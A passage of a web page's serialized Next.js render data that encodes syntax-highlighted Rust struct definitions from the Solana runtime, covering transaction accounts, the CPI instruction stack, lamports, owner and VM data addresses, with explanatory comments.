executable\"]}]\n229:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n22a:[\"$\",\"span\",\"code-segment-114\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n22b:[\"$\",\"span\",\"code-segment-115\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}]\n22c:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n22d:[\"$\",\"span\",\"code-segment-117\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n22e:[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[11]}]\n22f:[\"$\",\"span\",\"code-segment-119\",{\"className\":\""])</script><script>self.__next_f.push([1,"$undefined\",\"style\":{},\"children\":[\"\"]}]\n230:[\"$\",\"span\",\"code-segment-120\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n231:[\"$\",\"span\",\"code-segment-26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    accounts\"]}]\n232:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n233:[\"$\",\"span\",\"code-segment-28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n234:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Arc\"]}]\n235:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n236:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"TransactionAccounts\"]}]\n237:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n238:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n239:[\"$\",\"span\",\"code-segment-34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n23a:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Shared account data cache\"]}]\n23b:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n23c:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\n23d:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    instruction_stack\"]}]\n23e:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n23f:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n240:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]"])</script><script>self.__next_f.push([1,"}]\n241:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n242:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"InstructionContext\"]}]\n243:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n244:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n245:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n246:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// CPI call stack\"]}]\n247:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n248:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\n249:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n24a:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n24b:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n24c:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\n24d:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n24e:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n24f:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n250:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number"])</script><script>self.__next_f.push([1,"\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\n251:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\n252:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n253:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n254:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n255:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}]\n256:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n257:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"TransactionAccounts\"]}]\n258:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n259:[\"$\",\"span\",\"code-segment-67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n25a:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n25b:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\n25c:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    accounts\"]}]\n25d:[\"$\",\"span\",\"code-segment-71\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n25e:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"$undefined\",\"style\":{},\"children"])</script><script>self.__next_f.push([1,"\":[\" \"]}]\n25f:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}]\n260:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n261:[\"$\",\"span\",\"code-segment-75\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}]\n262:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n263:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountSharedData\"]}]\n264:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\n265:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n266:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"     \"]}]\n267:[\"$\",\"span\",\"code-segment-81\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Mutable account data\"]}]\n268:[\"$\",\"span\",\"code-segment-82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n269:[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[10]}]\n26a:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n26b:[\"$\",\"span\",\"code-segment-85\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n26c:[\"$\",\"span\",\"code-segment-86\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n26d:[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[11]}]\n26e:[\"$\",\"span\",\"code-segment"])</script><script>self.__next_f.push([1,"-88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n26f:[\"$\",\"span\",\"code-segment-89\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n270:[\"$\",\"span\",\"code-segment-90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n271:[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[12]}]\n272:[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[13]}]\n273:[\"$\",\"span\",\"code-segment-94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n274:[\"$\",\"span\",\"code-segment-95\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Shared account data that persists across CPI boundaries \"]}]\n275:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n276:[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[14]}]\n277:[\"$\",\"span\",\"code-segment-98\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n278:[\"$\",\"span\",\"code-segment-99\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n279:[\"$\",\"span\",\"code-segment-100\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n27a:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}]\n27b:[\"$\",\"span\",\"code-segment-102\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n27c:[\"$\",\"sp"])</script><script>self.__next_f.push([1,"an\",\"code-segment-103\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountSharedData\"]}]\n27d:[\"$\",\"span\",\"code-segment-104\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n27e:[\"$\",\"span\",\"code-segment-105\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n27f:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n280:[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[15]}]\n281:[\"$\",\"span\",\"code-segment-108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    lamports\"]}]\n282:[\"$\",\"span\",\"code-segment-109\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n283:[\"$\",\"span\",\"code-segment-110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n284:[\"$\",\"span\",\"code-segment-111\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n285:[\"$\",\"span\",\"code-segment-112\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n286:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n287:[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[16]}]\n288:[\"$\",\"span\",\"code-segment-115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    data\"]}]\n289:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n28a:[\"$\",\"span\",\"code-segment-117\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n28b:[\"$\",\"span\",\"code-segment-118\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children"])</script><script>self.__next_f.push([1,"\":[\"Arc\"]}]\n28c:[\"$\",\"span\",\"code-segment-119\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n28d:[\"$\",\"span\",\"code-segment-120\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}]\n28e:[\"$\",\"span\",\"code-segment-121\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n28f:[\"$\",\"span\",\"code-segment-122\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\n290:[\"$\",\"span\",\"code-segment-123\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\n291:[\"$\",\"span\",\"code-segment-124\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n292:[\"$\",\"span\",\"code-segment-125\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                           \"]}]\n293:[\"$\",\"span\",\"code-segment-126\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Thread-safe shared data buffer\"]}]\n294:[\"$\",\"span\",\"code-segment-127\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n295:[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[17]}]\n296:[\"$\",\"span\",\"code-segment-129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    owner\"]}]\n297:[\"$\",\"span\",\"code-segment-130\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n298:[\"$\",\"span\",\"code-segment-131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n299:[\"$\",\"span\",\"code-segment-132\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}]\n29a:[\"$\",\"span\",\"code-segment-133\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n29b:[\"$\",\"span\",\"code-segment-134\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n29c:[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"displ"])</script><script>self.__next_f.push([1,"ay\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[18]}]\n29d:[\"$\",\"span\",\"code-segment-136\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n29e:[\"$\",\"span\",\"code-segment-137\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n29f:[\"$\",\"span\",\"code-segment-138\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n2a0:[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[19]}]\n2a1:[\"$\",\"span\",\"code-segment-140\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n2a2:[\"$\",\"span\",\"code-segment-141\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n2a3:[\"$\",\"span\",\"code-segment-25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                  \"]}]\n2a4:[\"$\",\"span\",\"code-segment-26\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Direct mutable reference to lamports\"]}]\n2a5:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n2a6:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\n2a7:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    owner\"]}]\n2a8:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n2a9:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2aa:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"childr"])</script><script>self.__next_f.push([1,"en\":[\"\u0026\"]}]\n2ab:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}]\n2ac:[\"$\",\"span\",\"code-segment-34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2ad:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n2ae:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2af:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}]\n2b0:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n2b1:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                  \"]}]\n2b2:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Direct mutable reference to owner\"]}]\n2b3:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n2b4:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\n2b5:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    original_data_len\"]}]\n2b6:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n2b7:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2b8:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"usize\"]}]\n2b9:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n2ba:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"               \"]}]\n2bb:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Track size changes fo"])</script><script>self.__next_f.push([1,"r realloc handling\"]}]\n2bc:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n2bd:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\n2be:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    serialized_data\"]}]\n2bf:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n2c0:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2c1:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n2c2:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}]\n2c3:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2c4:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n2c5:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2c6:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\n2c7:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\n2c8:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\n2c9:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n2ca:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          \"]}]\n2cb:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Points to serialized data in VM\"]}]\n2cc:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n2cd:[\"$\",\"span\",\"line-number--7\",{\"class"])</script><script>self.__next_f.push([1,"Name\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\n2ce:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    vm_data_addr\"]}]\n2cf:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n2d0:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n2d1:[\"$\",\"span\",\"code-segment-71\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n2d2:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n2d3:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                      \"]}]\n2d4:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// VM address of AccountInfo.data pointer\"]}]\n2d5:[\"$\",\"span\",\"code-segment-75\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n2d6:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid 